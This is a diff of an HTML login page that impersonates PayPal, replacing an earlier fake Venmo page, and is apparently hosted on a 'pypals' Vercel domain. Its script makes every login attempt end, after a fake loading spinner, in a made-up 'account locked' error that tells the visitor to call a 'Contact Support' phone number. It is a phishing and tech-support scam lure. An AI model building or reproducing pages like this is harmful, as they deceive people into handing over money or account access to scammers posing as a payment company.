@@ -1,120 +1,230 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script defer data-domain="pypals-loginsins.vercel.app" src="https://plausible.io/js/script.js"></script>
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Venmo Login</title>
+    <title>Login Page</title>
     <style>
+        /* Existing CSS code */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
         body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f5f5f5;
+        }
+
+        .login-container {
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            background-color: #fff;
-            font-family: Arial, sans-serif;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
         }
-        .login-container {
-            text-align: center;
-            width: 350px;
-            padding: 40px;
+
+        .login-box {
+            background-color: white;
+            width: 100%;
+            padding: 40px 20px;
             border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
             position: relative;
         }
-        .error-box {
-            display: none;
-            background-color: red;
-            color: white;
-            padding: 10px;
-            border-radius: 6px;
-            position: absolute;
-            top: -50px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80%;
-            text-align: center;
-            font-size: 14px;
-        }
-        .login-container h1 {
-            font-size: 26px;
-            color: #007bff;
-            font-weight: bold;
-        }
-        .login-container h2 {
-            font-size: 20px;
+
+        .logo {
+            width: 60px;
             margin-bottom: 20px;
         }
-        .login-container input {
+
+        .error-message {
+            display: none;
+            color: red;
+            font-size: 14px;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        .input-field {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 6px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
             font-size: 16px;
         }
-        .password-container {
-            display: none;
+
+        .forgot-password {
+            display: block;
+            text-align: left;
+            color: #0070ba;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-decoration: none;
         }
-        .login-container button {
+
+        .login-btn {
             width: 100%;
             padding: 12px;
-            border: none;
-            border-radius: 25px;
-            background-color: #007bff;
+            background-color: #0070ba;
             color: white;
-            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-bottom: 20px;
         }
-        .login-container button:hover {
-            background-color: #0056b3;
+
+        .login-btn:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
         }
-        .signup {
-            margin-top: 10px;
-            border: 2px solid #007bff;
-            color: #007bff;
-            background: none;
-            font-size: 18px;
-        }
-        .signup:hover {
-            background-color: #e6f0ff;
-        }
-        .forgot-password {
-            display: none;
-            color: #007bff;
+
+        .divider {
             font-size: 14px;
-            margin-top: 10px;
+            color: #888;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .divider:before, .divider:after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background-color: #ddd;
+        }
+
+        .divider:before {
+            left: 0;
+        }
+
+        .divider:after {
+            right: 0;
+        }
+
+        .signup-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: transparent;
+            color: #333;
+            border: 1px solid #333;
+            border-radius: 5px;
+            font-size: 16px;
             cursor: pointer;
+        }
+
+        .language-selector {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .flag-icon {
+            width: 20px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #555;
+            text-align: center;
+            padding: 20px 0;
+            border-top: 1px solid #f0f0f0;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .footer a {
+            color: #555;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .loading-spinner {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0070ba;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
-    <script>
-        function showPasswordField() {
-            document.getElementById("emailInput").style.display = "none";
-            document.getElementById("nextButton").style.display = "none";
-            document.getElementById("passwordContainer").style.display = "block";
-            document.getElementById("forgotPassword").style.display = "block";
-        }
-        function showError() {
-            document.getElementById("errorBox").style.display = "block";
-        }
-    </script>
 </head>
 <body>
     <div class="login-container">
-        <div id="errorBox" class="error-box">Error: Invalid login credentials</div>
-        <h1>venmo</h1>
-        <h2>Log in</h2>
-        <div id="emailInput">
-            <input type="text" placeholder="Enter email, mobile, or username">
-            <button id="nextButton" onclick="showPasswordField()">Next</button>
+        <div class="login-box">
+            <img src="paypal logo.webp" alt="PayPal Logo" class="logo">
+            <!-- Error message displayed above input fields -->
+            <div id="error-message" class="error-message">Error Code: 0X0047893EE2 <br> Your account has been locked due to some suspicious login attempts. <br>Contact Support : <a href="tel:18557755280">+1-855-775-5280</a></div>
+            <form id="login-form">
+                <input type="text" placeholder="Email or mobile number" class="input-field">
+                <input type="password" placeholder="Password" class="input-field">
+                <a href="#" class="forgot-password">Forgotten password?</a>
+                <button type="button" id="login-btn" class="login-btn">Log In</button>
+                <div class="divider">or</div>
+                <button type="button" class="signup-btn">Sign Up</button>
+            </form>
+            <div class="language-selector">
+                <img src="USA Flag.webp" alt="US Flag" class="flag-icon">
+                <span>English</span> | Français | Español | 中文
+            </div>
+            <div id="loading-spinner" class="loading-spinner"></div>
         </div>
-        <div id="passwordContainer" class="password-container">
-            <p>jnfdkljfd <a href="#" style="color:#007bff; font-size:14px;">Change</a></p>
-            <input type="password" placeholder="Password">
-            <button onclick="showError()">Log in</button>
-        </div>
-        <p id="forgotPassword" class="forgot-password">Forgot password?</p>
-        <button class="signup">Sign up</button>
     </div>
+
+    <footer class="footer">
+        <a href="#">Contact Us</a> |
+        <a href="#">Privacy</a> |
+        <a href="#">Legal</a> |
+        <a href="#">Policy Updates</a> |
+        <a href="#">Worldwide</a>
+    </footer>
+
+    <script>
+        document.getElementById('login-btn').addEventListener('click', function() {
+            // Show loading spinner and disable login button
+            const spinner = document.getElementById('loading-spinner');
+            const errorMessage = document.getElementById('error-message');
+            const loginButton = document.getElementById('login-btn');
+            
+            spinner.style.display = 'block';
+            errorMessage.style.display = 'none';
+            loginButton.disabled = true;
+            
+            // Simulate a delay to show the loading spinner
+            setTimeout(function() {
+                // Hide loading spinner and show error message
+                spinner.style.display = 'none';
+                errorMessage.style.display = 'block';
+                loginButton.disabled = false;
+            }, 2000); // Adjust the delay time as needed
+        });
+    </script>
 </body>
 </html>
